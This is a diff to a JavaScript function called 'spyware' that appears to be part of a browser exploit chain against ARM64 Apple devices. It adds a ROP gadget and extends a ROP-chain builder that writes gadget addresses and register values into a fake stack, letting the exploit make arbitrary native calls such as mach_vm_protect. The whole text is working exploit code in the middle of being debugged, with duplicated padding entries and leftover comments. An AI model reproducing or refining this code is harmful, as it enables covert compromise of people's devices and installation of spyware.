@@ -233,6 +233,8 @@ function spyware(stage1, memory, binary)
             "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
             // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
             "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
+            // mov x4, x20 ; blr x8
+            "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
             // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
             // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
             "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
@@ -362,6 +364,7 @@ function spyware(stage1, memory, binary)
     var dispatch            = gadgets["dispatch"];
     var stackloader         = gadgets["stackloader"];
     var ldrx8               = gadgets["ldrx8"]; // might be undefined, then superb llvm gadgets are assumed
+    var movx4               = gadgets["movx4"]; // might be undefined, then superb llvm gadgets are assumed
     var mach_task_self_     = memory.readInt64(syms["_mach_task_self_"]);
     // zero higher bytes
     mach_task_self_         = new Int64(mach_task_self_.bytes().map((v, i)=>i<4?v:0));
@@ -471,6 +474,8 @@ function spyware(stage1, memory, binary)
 
 
     var add_call_llvm = function(func, x0, x1, x2, x3, x4, jump_to) {
+        x4 = x4 || Int64.Zero
+
         // in stackloader:
         arr[pos++] = 0xdead0010;                // unused
         arr[pos++] = 0xdead0011;                // unused
@@ -553,8 +558,13 @@ function spyware(stage1, memory, binary)
         arr[pos++] = ldrx8.hi();                // x30 (next gadget)
 
         // in ldrx8
-        arr[pos++] = dispatch.lo();             // x8 (target for regloader)
-        arr[pos++] = dispatch.hi();             // x8 (target for regloader)
+        if (x4) {
+            arr[pos++] = stackloader.lo();
+            arr[pos++] = stackloader.hi();
+        } else {
+            arr[pos++] = dispatch.lo();             // x8 (target for regloader)
+            arr[pos++] = dispatch.hi();             // x8 (target for regloader)
+        }
         arr[pos++] = 0xdead1401;                // (unused)
         arr[pos++] = 0xdead1402;                // (unused)
         arr[pos++] = 0xdead1301;                // x20 (unused)
@@ -568,12 +578,62 @@ function spyware(stage1, memory, binary)
 
         // in regloader
         // NOTE: REGLOADER DOES NOT ADJUST SP!
-        // FIXME: for some reason 0xbabe0000babe0000 is in x4 instead of
         // expected value, and i have no fucking idea why
-        arr[pos++] = x4.lo();                   // x4 (arg4)
-        arr[pos++] = x4.lo();                   // x4 (arg4)
+        //arr[pos++] = 0xdeaded01 // x4 (should be -- but see lines above)
+        //arr[pos++] = 0xdeaded02 // x4 (should be -- but see lines above)
+
+        if (x4) {
+            // in stackloader:
+            arr[pos++] = 0xdaad0010;                // unused
+            arr[pos++] = 0xdaad0011;                // unused
+            arr[pos++] = 0xdaad0012;                // unused
+            arr[pos++] = 0xdaad0013;                // unused
+            arr[pos++] = 0xdaad1101;                // x28 (unused)
+            arr[pos++] = 0xdaad1102;                // x28 (unused)
+            arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
+            arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
+            arr[pos++] = 0xdaad0016;                // x26 (unused)
+            arr[pos++] = 0xdaad0017;                // x26 (unused)
+            arr[pos++] = 0xdaad0018;                // x25 == x3 (arg4)
+            arr[pos++] = 0xdaad0019;                // x25 == x3 (arg4)
+            arr[pos++] = 0xdaad00f0;                // x24 == x0 (arg1)
+            arr[pos++] = 0xdaad00f1;                // x24 == x0 (arg1)
+            arr[pos++] = 0xdaad00f2;                // x23 == x2 (arg3)
+            arr[pos++] = 0xdaad00f3;                // x23 == x2 (arg3)
+            arr[pos++] = 0xdaad00f4;                // x22 == x3 (arg4)
+            arr[pos++] = 0xdaad00f5;                // x22 == x3 (arg4)
+            arr[pos++] = func.lo();                 // x21 (target for dispatch)
+            arr[pos++] = func.hi();                 // x21 (target for dispatch)
+            arr[pos++] = 0xdaad0018;                // x20 (unused)
+            arr[pos++] = 0xdaad0019;                // x20 (unused)
+            arr[pos++] = Add(stack, pos*4).lo();    // x19 (scratch address for str x8, [x19])
+            arr[pos++] = Add(stack, pos*4).hi();    // x19 (scratch address for str x8, [x19])
+            arr[pos++] = 0xdaad001c;                // x29 (unused)
+            arr[pos++] = 0xdaad001d;                // x29 (unused)
+            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+            arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+            // in ldrx8
+            arr[pos++] = dispatch.lo();             // x8 (target for movx4)
+            arr[pos++] = dispatch.hi();             // x8 (target for movx4)
+            arr[pos++] = 0xdaad1401;                // (unused)
+            arr[pos++] = 0xdaad1402;                // (unused)
+            arr[pos++] = x4.lo();                   // x20 == x4 (arg5)
+            arr[pos++] = x4.hi();                   // x20 == x4 (arg5)
+            arr[pos++] = 0xdaad1301;                // x19 (unused)
+            arr[pos++] = 0xdaad1302;                // x19 (unused)
+            arr[pos++] = 0xdaad1201;                // x29 (unused)
+            arr[pos++] = 0xdaad1202;                // x29 (unused)
+            arr[pos++] = movx4.lo();                // x30 (next gadget)
+            arr[pos++] = movx4.hi();                // x30 (next gadget)
+        }
 
         // after dispatch:
+
+        // keep only one: these or 0xdeaded01
+        arr[pos++] = 0xdead0022;                // unused
+        arr[pos++] = 0xdead0023;                // unused
+
         arr[pos++] = 0xdead0022;                // unused
         arr[pos++] = 0xdead0023;                // unused
         arr[pos++] = 0xdead0024;                // x22 (unused)
@@ -595,7 +655,6 @@ function spyware(stage1, memory, binary)
         x1 = x1 || Int64.Zero
         x2 = x2 || Int64.Zero
         x3 = x3 || Int64.Zero
-        x4 = x4 || Int64.Zero
         jump_to = jump_to || stackloader
 
         return (ldrx8 ? add_call_via_x8 : add_call_llvm)(
@@ -605,12 +664,12 @@ function spyware(stage1, memory, binary)
 
     add_call(mach_vm_protect);
 
-    add_call(new Int64(0x1244),
+    add_call(new Int64(0x1204),
         new Int64(0xcafe000fbabe000c),
         new Int64(0xcafe010fbabe010c),
         new Int64(0xcafe020fbabe010c),
-        new Int64(0xcafe030fbabe010c),
-        new Int64(0xcafe040fbabe010c)
+        new Int64(0xcafe030fbabe010c)
+//        new Int64(0xcafe040fbabe010c)
     );
 
     add_call(mach_vm_protect,
